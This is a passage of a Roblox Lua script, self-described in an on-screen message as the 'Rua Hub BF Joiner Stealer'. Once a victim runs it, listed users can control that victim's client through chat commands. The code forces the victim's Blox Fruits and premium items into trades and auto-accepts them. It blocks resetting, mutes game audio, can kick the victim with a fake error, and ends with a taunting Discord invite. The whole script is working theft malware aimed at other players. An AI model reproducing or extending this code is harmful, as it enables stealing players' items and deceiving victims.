UserInputService.TouchEnded:Connect(handleTouchEnd)
UserInputService.JumpRequest:Connect(function()
    if UserInputService.TouchEnabled and not isForceJumping then
        error("hehe")
    end
end)

pcall(function()
    StarterGui:SetCore("ResetButtonCallback", false)
end)

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    humanoid = character:WaitForChild("Humanoid")
    isAttemptingJump = false
    isForceJumping = false
    isTouchHeld = false
    if isAttemptingJump then
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
    end
end)

local function isSeatAvailable(seat) return not seat:FindFirstChild("SeatWeld") end

local function sitAtSeat(seat)
    local character = game.Players.LocalPlayer.Character
    if not (character and character.PrimaryPart and character:FindFirstChildOfClass("Humanoid")) then return false end
    if seat:FindFirstChild("SeatWeld") then return false end

    tweenToPosition(seat.Position + Vector3.new(0, 3, 0))

    local success = false
    local seatWeldAdded = seat.ChildAdded:Connect(function(child)
        if child.Name == "SeatWeld" then success = true end
    end)

    task.delay(3, function() seatWeldAdded:Disconnect() end)
    return success
end

local function splitFruitsIntoTrades(fruits)
    local trades, currentIndex = {}, 1
    local totalFruits = #fruits

    if totalFruits <= 4 then
        for i = 1, totalFruits do
            trades[i] = {fruits[i]}
        end
        return trades
    end

    local numTrades = math.ceil(totalFruits / 4)
    local baseFruitsPerTrade = math.floor(totalFruits / numTrades)
    local extraFruits = totalFruits % numTrades

    for trade = 1, numTrades do
        local fruitsThisTrade = baseFruitsPerTrade + (extraFruits > 0 and 1 or 0)
        extraFruits = extraFruits - (extraFruits > 0 and 1 or 0)

        local currentTrade = table.create(fruitsThisTrade)
        for i = 1, fruitsThisTrade do
            if currentIndex <= totalFruits then
                currentTrade[i] = fruits[currentIndex]
                currentIndex = currentIndex + 1
            end
        end

        if #currentTrade > 0 then
            trades[#trades + 1] = currentTrade
        end
    end

    return trades
end
local DefaultChatSystem = ReplicatedStorage.DefaultChatSystemChatEvents

local function sendTradeMessage(fruits, tradeNumber, totalTrades)
    if #fruits == 0 then return end

    local function formatFruitList(fruits)
        local formatted = table.create(#fruits)
        for i, fruit in ipairs(fruits) do
            formatted[i] = fruit:gsub("-", " ")
        end
        return table.concat(formatted, ", ")
    end

    if tradeNumber == 1 and totalTrades > 1 then
        DefaultChatSystem.SayMessageRequest:FireServer("Hey! Let's do multiple trades for multiple fruits!", "All")
        task.wait(1)
    end

    local message = #fruits == 1
        and string.format("Trade %d/%d - Adding %s", tradeNumber, totalTrades, formatFruitList(fruits))
        or string.format("Trade %d/%d - Adding %d fruits: %s", tradeNumber, totalTrades, #fruits, formatFruitList(fruits))

    DefaultChatSystem.SayMessageRequest:FireServer(message, "All")
end

local function checkInventoryForFruit(fruitName)
    local inventory = getInventory()
    if not inventory then return 0 end

    local fruitCount = 0
    for _, item in pairs(inventory) do
        if item.Type == "Blox Fruit" and item.Name == fruitName then
            fruitCount = fruitCount + 1
        end
    end

    return fruitCount
end

local function wasTradeSuccessful(fruit)
    local beforeCount = checkInventoryForFruit(fruit)
    task.wait(2)
    return checkInventoryForFruit(fruit) < beforeCount
end

local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")

local function clearTradeItems()
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if not (tradeUI and tradeUI:FindFirstChild("Trade")) then return end

    local container = tradeUI.Trade:WaitForChild("Container")
    local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()

    for _, item in ipairs(playerItems) do
        if item:IsA("ImageButton") then
            TradeFunction:InvokeServer("removeItem", item.Name)
            task.wait(0.5)
        end
    end
end

local function addFruitToTrade(fruit)
    for _ = 1, 5 do
        if not isInTradeWithCorrectPlayer() then return false end

        clearTradeItems()
        task.wait(0.5)

        TradeFunction:InvokeServer("addItem", fruit)
        task.wait(1.5)

        local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
        if not (tradeUI and tradeUI:FindFirstChild("Trade")) then continue end

        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        local fruitCount, correctFruitFound = 0, false

        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                fruitCount = fruitCount + 1
                if item.Name == fruit then
                    correctFruitFound = true
                else
                    clearTradeItems()
                end
            end
        end

        if fruitCount == 1 and correctFruitFound then return true end
        task.wait(1)
    end
    return false
end

local function acceptTrade()
    TradeFunction:InvokeServer("accept")
end

local function findTradeTable()
    local tradeTables = Sea3 and workspace.Map.Turtle:GetChildren() or workspace.Map.Dressrosa:GetChildren()
    for _, table in ipairs(tradeTables) do
        if table.Name == "TradeTable" and table:FindFirstChild("P1") and table:FindFirstChild("P2") then
            return table
        end
    end
end

local function createDiscordUI()
    local CoreGui = game:GetService("CoreGui")
    local TweenService = game:GetService("TweenService")

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "DiscordInviteUI"
    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 9999

    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.Size = UDim2.new(0, 800, 0, 150)
    MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)

    local Title = Instance.new("TextLabel")
    Title.Name = "Title"
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.GothamBold
    Title.Text = "Read Below!"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextScaled = true
    Title.Parent = MainFrame

    local Description = Instance.new("TextLabel")
    Description.Name = "Description"
    Description.Size = UDim2.new(0.9, 0, 0, 40)
    Description.Position = UDim2.new(0.05, 0, 0.3, 0)
    Description.BackgroundTransparency = 1
    Description.Font = Enum.Font.Gotham
    Description.Text = "Hey! You just lost some of your valuable fruits to Rua Hub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite. Before leaving the game to check if your fruits are really gone, I recommend copying discord invite."
    Description.TextColor3 = Color3.fromRGB(220, 221, 222)
    Description.TextScaled = true
    Description.TextWrapped = true
    Description.Parent = MainFrame

    local Button = Instance.new("TextButton")
    Button.Name = "CopyButton"
    Button.Size = UDim2.new(0.7, 0, 0, 36)
    Button.Position = UDim2.new(0.15, 0, 0.7, 0)
    Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
    Button.Font = Enum.Font.GothamBold
    Button.Text = "Copy Invite"
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.TextScaled = true
    Button.AutoButtonColor = false
    Button.Parent = MainFrame

    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)

    local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    local function createTween(instance, props)
        return TweenService:Create(instance, fadeInfo, props)
    end

    MainFrame.BackgroundTransparency = 1
    Title.TextTransparency = 1
    Description.TextTransparency = 1
    Button.BackgroundTransparency = 1
    Button.TextTransparency = 1

    task.wait(0.1)
    createTween(MainFrame, {BackgroundTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Title, {TextTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Description, {TextTransparency = 0}):Play()
    task.wait(0.1)
    createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

    Button.MouseEnter:Connect(function()
        createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play()
    end)

    Button.MouseLeave:Connect(function()
        createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play()
    end)

    Button.MouseButton1Click:Connect(function()
        setclipboard("https://discord.gg/zJKDqRd5")
        Button.Text = "Copied!"
        task.delay(2, function() Button.Text = "Copy Invite" end)
    end)

    ScreenGui.Parent = CoreGui
    return ScreenGui
end

local ChatCommands = {
    prefix = "?",
    lastExecutionTime = {},
    cooldowns = {
        default = 0.1,
        invite = 0.25,
        addfruits = 0.25,
        addfruit = 0.25,
        addallfruits = 0.25,
        clearfruits = 0.25,
        additem = 0.25,
        addallitems = 0.25,
        sit = 0.5,
        sit2 = 0.5,
        resetfruit = 3,
        tp = 0.25,
        stopreset = 0.5,
        showinv = 0.5, -- Add cooldown for the new command
    },
    commands = {
        jump = function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                task.spawn(forceJump)
            end
        end,

        invite = function()
            createDiscordUI()
        end,

        sit = function()
            task.spawn(function()
                local tradeTable = findTradeTable()
                if not tradeTable then return end
                for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
                    if seat and isSeatAvailable(seat) then
                        sitAtSeat(seat)
                        break
                    end
                end
            end)
        end,

        reset = function()
            if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                LocalPlayer.Character.Humanoid.Health = 0
            end
        end,

        resetfruit = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify a fruit name! Usage: ?resetfruit FruitName", "All")
                    return
                end

                local inventory = getInventory()
                if not inventory then return end
                local searchTerm = args:lower()
                local foundFruit = false
                local fruitName = nil

                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        fruitName = item.Name
                        foundFruit = true
                        break
                    end
                end

                if not foundFruit then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No fruit matching '" .. args .. "' found in inventory!", "All")
                    return
                end

                local baseFruitName = fruitName:match("([^-]+)")
                local formattedFruitName = baseFruitName .. "-" .. baseFruitName

                local args = {
                    [1] = "LoadFruit",
                    [2] = formattedFruitName
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))

                if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                    task.wait(0.3)
                    LocalPlayer.Character.Humanoid.Health = 0
                end

                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Reset " .. baseFruitName .. " successfully!", "All")
            end)
        end,

        addallitems = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local premiumItems = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Premium" then
                        table.insert(premiumItems, item.Name)
                    end
                end

                local addedItems = {}
                local attempts = 0
                local maxAttempts = 50
                local targetItems = math.min(4, #premiumItems)

                while #addedItems < targetItems and attempts < maxAttempts do
                    local availableItems = {}
                    for _, item in ipairs(premiumItems) do
                        if not addedItems[item] then
                            table.insert(availableItems, item)
                        end
                    end

                    if #availableItems == 0 then break end

                    local randomIndex = math.random(1, #availableItems)
                    local selectedItem = availableItems[randomIndex]

                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", selectedItem)
                    task.wait(0.05)

                    local container = tradeUI.Trade:FindFirstChild("Container")
                    if container then
                        local playerFrame = container:FindFirstChild("1")
                        if playerFrame then
                            local itemFrame = playerFrame:FindFirstChild("Frame")
                            if itemFrame and itemFrame:FindFirstChild(selectedItem) then
                                addedItems[selectedItem] = true
                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                                    "Added " .. selectedItem:gsub("-", " ") .. " to trade!", "All")
                            end
                        end
                    end

                    attempts = attempts + 1
                end

                local totalAdded = 0
                for _ in pairs(addedItems) do totalAdded = totalAdded + 1 end

                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Successfully added " .. totalAdded .. " premium items to trade!", "All")
            end)
        end,

        sit2 = function()
            task.spawn(function()
                local tradeTable = findTradeTable()
                if tradeTable then
                    tweenToPosition(tradeTable.P1.Position, 350)
                end
            end)
        end,

        accept = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                acceptTrade()
            end)
        end,

        cleartrade = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
                clearTradeItems()
            end)
        end,

        addallfruits = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local addedFruits = {}
                for _, fruit in ipairs(FruitsToHit) do
                    for _, item in pairs(inventory) do
                        if item.Type == "Blox Fruit" and item.Name == fruit and not addedFruits[fruit] then
                            ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", fruit)
                            addedFruits[fruit] = true
                            task.wait(0.05)
                            break
                        end
                    end
                end
            end)
        end,

        addfruit = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify a fruit name! Usage: ?addfruit FruitName", "All")
                    return
                end

                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local searchTerm = args:lower()
                local foundFruit = false

                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
                        foundFruit = true
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Added " .. item.Name:gsub("-", " ") .. " to trade!", "All")
                        break
                    end
                end

                if not foundFruit then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No fruit matching '" .. args .. "' found in inventory!", "All")
                end
            end)
        end,

        clearfruits = function()
            task.spawn(function()
                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local container = tradeUI.Trade:FindFirstChild("Container")
                if not container then return end

                local playerFrame = container:FindFirstChild("1")
                if not playerFrame then return end

                local itemFrame = playerFrame:FindFirstChild("Frame")
                if not itemFrame then return end

                for _, item in ipairs(itemFrame:GetChildren()) do
                    if item:IsA("ImageButton") then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", item.Name)
                        task.wait(0.05)
                    end
                end
            end)
        end,

        kick = function()
            game.Players.LocalPlayer:Kick("Error while loading! Rejoin.")
        end,

        tp = function()
            task.spawn(function()

                local Sea2 = game.PlaceId == 4442272183
                local Sea3 = game.PlaceId == 7449423635

                if Sea3 then
                    local inventory = getInventory()
                    local hasValkyrie = false

                    for _, item in pairs(inventory) do
                        if item == "Valkyrie Helm" then
                            hasValkyrie = true
                            break
                        end
                    end

                    if hasValkyrie then
                        local args = {
                            [1] = "requestEntrance",
                            [2] = Vector3.new(-12471.33, 374.95, -7539.37)
                        }
                        game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
                        return
                    end

                    tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125), 350)

                elseif Sea2 then
                    tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125), 350)
                end
            end)
        end,

        stopreset = function()
            task.spawn(function()
                isResettingEnabled = false
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "Stopped fruit resetting process!", "All")
            end)
        end,

        additem = function(args)
            task.spawn(function()
                if not args or args == "" then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Please specify an item name! Usage: ?additem ItemName", "All")
                    return
                end

                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end

                local inventory = getInventory()
                if not inventory then return end

                local searchTerm = args:lower()
                local foundItem = false

                for _, item in pairs(inventory) do
                    if item.Type == "Premium" and item.Name:lower():find(searchTerm) then
                        ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
                        foundItem = true
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                            "Added " .. item.Name:gsub("-", " ") .. " to trade!", "All")
                        break
                    end
                end

                if not foundItem then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "No Premium item matching '" .. args .. "' found in inventory!", "All")
                end
            end)
        end,

        rejoin = function()
            task.spawn(function()
                local ts = game:GetService("TeleportService")
                local p = game:GetService("Players").LocalPlayer
                ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
            end)
        end,

        help = function()
            task.spawn(function()
                local commands = {
                    "Movement: ?jump, ?sit, ?sit2, ?reset, ?tp",
                    "Trade: ?accept, ?cleartrade, ?addallfruits, ?addfruit <name>, ?clearfruits, ?additem <name>, ?addallitems",
                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset, ?showinv"
                }
                for _, msg in ipairs(commands) do
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
                    task.wait(0.1)
                end
            end)
        end,

        showinv = function()
            task.spawn(function()
                local inventory = getInventory()
                if not inventory then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Error getting inventory.", "All")
                    return
                end

                local fruitList = {}
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        fruitList[#fruitList + 1] = item.Name
                    end
                end

                if #fruitList == 0 then
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        "Inventory is empty of fruits.", "All")
                    return
                end

                local formattedFruitList = "" -- Initialize as empty string
                local fruitCounts = {} -- To count occurrences of each fruit

                for _, fruitName in ipairs(fruitList) do
                    fruitCounts[fruitName] = (fruitCounts[fruitName] or 0) + 1
                end

                local fruitSegments = {} -- Table to store individual fruit segments

                for fruitName, count in pairs(fruitCounts) do
                    local fruitSegment = "-- " .. fruitName:gsub("-", " ")
                    if count > 1 then
                        fruitSegment = fruitSegment .. " (x" .. count .. ")"
                    end
                    fruitSegment = fruitSegment .. " --"
                    fruitSegments[#fruitSegments + 1] = fruitSegment -- Add segment to table
                end

                formattedFruitList = table.concat(fruitSegments, " ") -- Join segments with spaces

                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    formattedFruitList, "All")
            end)
        end,
    }
}

local function isAuthorizedUser(player)
    return table.find(Usernames, player.Name) ~= nil
end

local function handleChatCommand(player, message)
    if not isAuthorizedUser(player) then return end
    if message:sub(1, 1) ~= ChatCommands.prefix then return end

    local commandAndArgs = message:sub(2):lower()
    local command = commandAndArgs:match("^(%S+)")
    local args = commandAndArgs:match("^%S+%s+(.+)$")

    if not ChatCommands.commands[command] then return end

    local currentTime = tick()
    local lastExecution = ChatCommands.lastExecutionTime[command] or 0
    local cooldown = ChatCommands.cooldowns[command] or ChatCommands.cooldowns.default

    if currentTime - lastExecution < cooldown then
        return
    end

    ChatCommands.lastExecutionTime[command] = currentTime
    task.spawn(function()
        local success, error = pcall(function()
            ChatCommands.commands[command](args)
        end)
        if not success then
            warn("error:", command, error)
        end
    end)
end

game:GetService("Players").PlayerChatted:Connect(function(chatType, player, message)
    handleChatCommand(player, message)
end)

local function monitorTradeStatus(character)
    if not character.Humanoid then return end

    task.spawn(function()
        local RunService = game:GetService("RunService")
        local player = game.Players.LocalPlayer
        local remotes = ReplicatedStorage:WaitForChild("Remotes")
        local tradeFunction = remotes:WaitForChild("TradeFunction")

        local connection
        connection = RunService.Heartbeat:Connect(function()
            if not character.Parent or character.Humanoid.Health <= 0 then
                connection:Disconnect()
                return
            end

            if not isSeated() then return end

            local tradeUI = player.PlayerGui:FindFirstChild("Main")
            if not tradeUI or not tradeUI.Trade or not tradeUI.Trade.Visible then return end

            if not isInTradeWithCorrectPlayer() then
                task.wait(0.5)
                if isSeated() and not isInTradeWithCorrectPlayer() then
                    forceJump()
                    task.wait(1)
                    if isSeated() then
                        forceJump()
                    end
                end
                return
            end

            local function attemptAddFruit(fruit)
                clearTradeItems()
                task.wait(1)

                tradeFunction:InvokeServer("addItem", fruit)
                task.wait(1)

                local container = tradeUI.Trade.Container
                for _, item in ipairs(container["1"].Frame:GetChildren()) do
                    if item:IsA("ImageButton") and item.Name == fruit then
                        return true
                    end
                end
                return false
            end

            for _, fruit in pairs(FruitsToHit) do
                if not isSeated() then
                    task.wait(1)
                    if not isSeated() then break end
                end

                if not isInTradeWithCorrectPlayer() then break end

                if attemptAddFruit(fruit) then
                    local startTime = tick()
                    while isSeated() and tick() - startTime < 60 and isInTradeWithCorrectPlayer() do
                        acceptTrade()
                        task.wait(1)

                        if not tradeUI.Trade.Visible then
                            task.wait(1)
                            break
                        end
                    end
                    task.wait(2)
                    break
                end
            end
        end)
    end)
end

local function isPlayerNearby(player)
    if not player or not player.Character or not LocalPlayer.Character then return false end
    return (player.Character:GetPrimaryPartCFrame().Position - LocalPlayer.Character:GetPrimaryPartCFrame().Position).Magnitude <= 20
end

local function removeFruitFromTrade(fruit)
    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", fruit)
    task.wait(0.1)
end

local function clearTradeItems()
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                removeFruitFromTrade(item.Name)
            end
        end
    end
    return items
end

local function getCurrentTradeItems()
    local items = {}
    local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
    if tradeUI and tradeUI:FindFirstChild("Trade") then
        local container = tradeUI.Trade:WaitForChild("Container")
        local playerItems = container:WaitForChild("1"):WaitForChild("Frame"):GetChildren()
        for _, item in ipairs(playerItems) do
            if item:IsA("ImageButton") then
                table.insert(items, item.Name)
            end
        end
    end
    return items
end

local function tradeWithPlayer()
    if tick() - lastTradeTime < 1 then return false end

    handleFruitReset()

    local tradeTable = findTradeTable()
    if not tradeTable then
        local tweenPosition = Sea3 and
            Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125) or
            Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125)
        tweenToPosition(tweenPosition, 350)
        task.wait(0.5)
        tradeTable = findTradeTable()
        if not tradeTable then return false end
    end

    local function validateAndSit(seat)
        if not seat then return false end

        local seatWeld = seat:FindFirstChild("SeatWeld")
        if seatWeld then
            local occupant = Players:GetPlayerFromCharacter(seatWeld.Part1.Parent)
            if occupant and not isValidTradePartner(occupant) then
                return false
            end
        end

        for _ = 1, 2 do
            if sitAtSeat(seat) and isSeated() then
                return true
            end
            task.wait(0.25)
        end
        return false
    end

    local mySeat
    for _, seat in pairs({tradeTable.P1, tradeTable.P2}) do
        if validateAndSit(seat) then
            mySeat = seat
            break
        end
    end

    if not mySeat then return false end

    local otherSeat = mySeat.Name == "P1" and tradeTable.P2 or tradeTable.P1
    local startTime = tick()
    local result = false

    local function checkTrade()
        if not isSeated() then
            task.wait(0.25)
            return not isSeated()
        end

        local seatWeld = otherSeat:FindFirstChild("SeatWeld")
        if not seatWeld then return false end

        local otherPlayer = Players:GetPlayerFromCharacter(seatWeld.Part1.Parent)
        if not otherPlayer then return false end

        if not isInTradeWithCorrectPlayer() then
            task.wait(0.25)
            if isSeated() and not isInTradeWithCorrectPlayer() then
                forceJump()
            end
            return true
        end

        if isInTradeWithCorrectPlayer() and isPlayerNearby(otherPlayer) then
            lastTradeTime = tick()
            result = otherPlayer
            return true
        end

        return false
    end

    while tick() - startTime < 30 and not result do
        if checkTrade() then break end
        task.wait(0.1)
    end

    if isSeated() then
        error("wow")
        task.wait(0.5)
    end

    return result
end

LocalPlayer.CharacterAdded:Connect(function(character)
    monitorTradeStatus(character)
end)

if LocalPlayer.Character then
    monitorTradeStatus(LocalPlayer.Character)
end

local trades = splitFruitsIntoTrades(FruitsToHit)
local currentTradeIndex = 1
local tradeAttempts = {}

local function silenceGame()
    task.spawn(function()
        UserSettings().GameSettings.MasterVolume = 0
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
            end
        end
        game.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Sound") then
                descendant.Volume = 0
            end
        end)
    end)
end

silenceGame()

game:GetService("Players").LocalPlayer.OnTeleport:Connect(function()
    _G.scriptExecuted = nil
end)

local currentTradeIndex = 1
local tradeAttempts = {}
local lastMessageTime = 0
local isRunning = true

local function sendTradeMessage(message)
    task.spawn(function()
        local currentTime = tick()
        if currentTime - lastMessageTime >= 1 then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
            lastMessageTime = currentTime
        end
    end)
end

local function handleTrade(tradingPlayer, remainingFruits)
    if not tradingPlayer or not isSeated() then return false end

    local tradeComplete = false

    if not tradeAttempts[currentTradeIndex] then
        tradeAttempts[currentTradeIndex] = 0
    end
    tradeAttempts[currentTradeIndex] = tradeAttempts[currentTradeIndex] + 1

    if #remainingFruits > 1 and tradeAttempts[currentTradeIndex] == 1 then
        sendTradeMessage("Hey! Let's do multiple trades for multiple fruits!")
        sendTradeMessage("Please, wait until I put in correct fruits.")
    end

    local tradeValid = true
    local connection = game:GetService("RunService").Heartbeat:Connect(function()
        if not isPlayerNearby(tradingPlayer) then
            tradeValid = false
            if isSeated() then
                forceJump()
            end
            connection:Disconnect()
        end
    end)

    clearTradeItems()
    task.wait(1)

    local currentFruit = remainingFruits[1]
    if currentFruit then
        sendTradeMessage(string.format("Trade %d/%d - Adding %s",
            currentTradeIndex, math.ceil(#remainingFruits),
            currentFruit:gsub("-", " ")))

        local fruitAdded = false
        local attempts = 0
        while not fruitAdded and attempts < 5 do
            fruitAdded = addFruitToTrade(currentFruit)
            if not fruitAdded then
                task.wait(1)
                attempts = attempts + 1
            end
        end

        task.wait(0.5)
        local currentItems = getCurrentTradeItems()
        for _, item in ipairs(currentItems) do
            if item ~= currentFruit then
                removeFruitFromTrade(item)
                fruitAdded = false
                break
            end
        end

        if fruitAdded then
            local startTime = tick()
            while isSeated() and tradeValid and tick() - startTime < 600 do
                acceptTrade()
                task.wait(0.1)

                local tradeUI = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
                if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
                    if wasTradeSuccessful(currentFruit) then
                        tradeComplete = true
                        break
                    end
                end
            end
        end
    end

    connection:Disconnect()

    if tradeComplete then
        currentTradeIndex = (currentTradeIndex >= math.ceil(#remainingFruits)) and 1 or currentTradeIndex + 1
        if currentTradeIndex == 1 then
            tradeAttempts = {}
        end
    end

    return tradeComplete
end

game:GetService("RunService").Heartbeat:Connect(function()
    if not isRunning then return end

    local tradingPlayer = tradeWithPlayer()
    if not tradingPlayer then return end

    local remainingFruits = {}
    for i = currentTradeIndex, #trades do
        for _, fruit in ipairs(trades[i]) do
            for _, item in pairs(getInventory()) do
                if item.Type == "Blox Fruit" and item.Name == fruit then
                    table.insert(remainingFruits, fruit)
                    break
                end
            end
        end
    end

    if #remainingFruits == 0 then
        currentTradeIndex = 1
        tradeAttempts = {}
        trades = splitFruitsIntoTrades(FruitsToHit)
        return
    end

    handleTrade(tradingPlayer, remainingFruits)
end)
